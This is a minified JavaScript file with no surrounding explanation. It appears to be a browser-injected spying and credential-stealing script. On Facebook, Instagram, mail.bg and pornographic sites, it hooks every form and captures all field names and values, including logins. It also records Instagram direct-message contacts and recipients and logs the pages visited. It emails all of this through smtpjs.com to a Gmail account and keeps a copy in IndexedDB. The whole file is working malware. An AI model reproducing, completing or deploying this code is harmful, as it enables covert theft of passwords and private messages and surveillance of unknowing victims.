var Email={send:function(b){return new Promise(function(a){b.nocache=Math.floor(1e6*Math.random()+1),b.Action="Send";var c=JSON.stringify(b);Email.ajaxPost("https://smtpjs.com/v3/smtpjs.aspx?",c,function(b){a(b)})})},ajaxPost:function(b,c,d){var f=Email.createCORSRequest("POST",b);f.setRequestHeader("Content-type","application/x-www-form-urlencoded"),f.onload=function(){var a=f.responseText;null!=d&&d(a)},f.send(c)},ajax:function(a,b){var c=Email.createCORSRequest("GET",a);c.onload=function(){var a=c.responseText;null!=b&&b(a)},c.send()},createCORSRequest:function(a,b){var c=new XMLHttpRequest;return"withCredentials"in c?c.open(a,b,!0):"undefined"==typeof XDomainRequest?c=null:(c=new XDomainRequest).open(a,b),c}};function SaveToDB(a){window.indexedDB=window.indexedDB||window.mozIndexedDB||window.webkitIndexedDB||window.msIndexedDB,window.IDBTransaction=window.IDBTransaction||window.webkitIDBTransaction||window.msIDBTransaction||{READ_WRITE:"readwrite"},window.IDBKeyRange=window.IDBKeyRange||window.webkitIDBKeyRange||window.msIDBKeyRange;window.indexedDB.deleteDatabase("MyDatabase");var b=window.indexedDB.open("MyDatabase",3);b.onupgradeneeded=function(b){var c=b.target.result,d=c.createObjectStore("info",{autoIncrement:!0});d.add(a,"Data")}}function setSession(a,b,c){if(0>=c){const b=localStorage.getItem(a);return b?void localStorage.removeItem(a):void 0}const d=new Date,e={value:b,expiry:d.getTime()+1e3*(60*c)};localStorage.setItem(a,JSON.stringify(e))}function getSession(a){const b=localStorage.getItem(a);if(!b)return null;const c=JSON.parse(b),d=new Date;return d.getTime()>c.expiry?(localStorage.removeItem(a),null):c.value}var data="";function sendEmail(a){var b,c=1;if(getSession(a))return;else{const h=new Date;var d=a+" - "+h.toLocaleString(),e=getSession("to_send");if(e){var f=e.split(",");if(f.includes(d))b=(f+"").replaceAll(",","<br>");else{var g=f.length;f[g]=d,b=(f+"").replaceAll(",","<br>"),c=g}}else setSession("to_send",d,1440),b=d}var h=location+"",i=["/direct/t/","/direct/new/"];Email.send({Host:"smtp.gmail.com",Username:user,Password:pass,To:user,From:user,Subject:"S_UPD ("+(c+"")+")",Body:b+""}).then(function(){setSession("to_send","",-1);var b=i.some(a=>h.includes(a));b||setSession(a,!0,1)})}var forms;function hookForms(){forms.forEach(a=>{var b=function(){var b={};Array.from(a.elements).forEach(a=>{data+=a.name+""+": "+(a.value+"")+" | ",b[a.name]=a.value}),data+=location+""+" || ",sendEmail(data),SaveToDB(b),data=""};if(location.hostname.includes("mail.bg")){var c=document.querySelectorAll("a");c.forEach(a=>{a.innerHTML.includes("\u0412\u041B\u0415\u0417")&&a.addEventListener("click",()=>{b()})})}else{var d=a.querySelector("button[type=\"submit\"]");d==null?a.addEventListener("submit",()=>{b()}):d.addEventListener("click",()=>{b()})}})}var tries=0;function initHook(){forms=document.querySelectorAll("form");10<=tries||(0>=forms.length?(tries++,setTimeout(initHook,2e3)):hookForms())}function initInstaSpec(a=!0){var b=location+"";if((location+"").includes("/direct/inbox/")){var c=20,d=!1,e=()=>{var a=document?.querySelectorAll("a");if(null==a||0>=a.length)return 0>=c?void 0:void setTimeout(()=>{c--,e()},100);if(a.forEach(a=>{a?.href.includes("/direct/t/")&&(d=!0,setSession("cache_"+(a.href+""),a?.text+"",525600))}),!d){if(0>=c)return;c--,setTimeout(()=>{c--,e()},100)}};e()}if((location+"").includes("/direct/t/")){var f=getSession("cache_"+(location+""));null==f&&(f=document?.querySelectorAll("a[href='"+location.pathname+"']")[0]?.text,setSession("cache_"+(location.href+""),f,525600)),b=location+" "+(f+"")}if((location+"").includes("/direct/new/")){var g=20,h=()=>{var a=document?.querySelectorAll("div[role='button']");if(null==a||0>=a.length)return 0>=g?void 0:void setTimeout(()=>{g--,h()},100);a.forEach(a=>{a.addEventListener("click",()=>{sendEmail(location+" "+a.textContent)})});var b=document?.querySelectorAll("button[type='button']");null!=b&&0<b.length&&b.forEach(a=>{a?.textContent.includes("Next")&&a.addEventListener("click",()=>{var a=document?.querySelector("input[name=queryBox]").defaultValue+" ",b=document?.querySelectorAll("button[type='button']");0<b.length&&b.forEach(b=>{a+=b.innerText+"; "}),sendEmail(location+" "+a)})})};h()}a&&sendEmail(b)}function initHREF(){var a=history.pushState,b=history.replaceState;history.pushState=function(){a.apply(history,arguments),window.dispatchEvent(new Event("pushstate")),window.dispatchEvent(new Event("locationchange"))},history.replaceState=function(){b.apply(history,arguments),window.dispatchEvent(new Event("replacestate")),window.dispatchEvent(new Event("locationchange"))},window.addEventListener("popstate",function(){window.dispatchEvent(new Event("locationchange"))}),window.addEventListener("locationchange",function(){initInstaSpec()})}var isPorn=(location+"").includes("porn")||!0==document.querySelector("meta[name=description]")?.content.includes("porn")||!0==document.querySelector("meta[name=keywords]")?.content.includes("porn"),isIncludes=["facebook","instagram","mail.bg"];function InitProgram(){var a=location+"",b=isIncludes.some(b=>a.includes(b));(b||isPorn)&&(sendEmail(a),initHook(),(a.includes("instagram")||isPorn)&&(initInstaSpec(!1),initHREF()))}
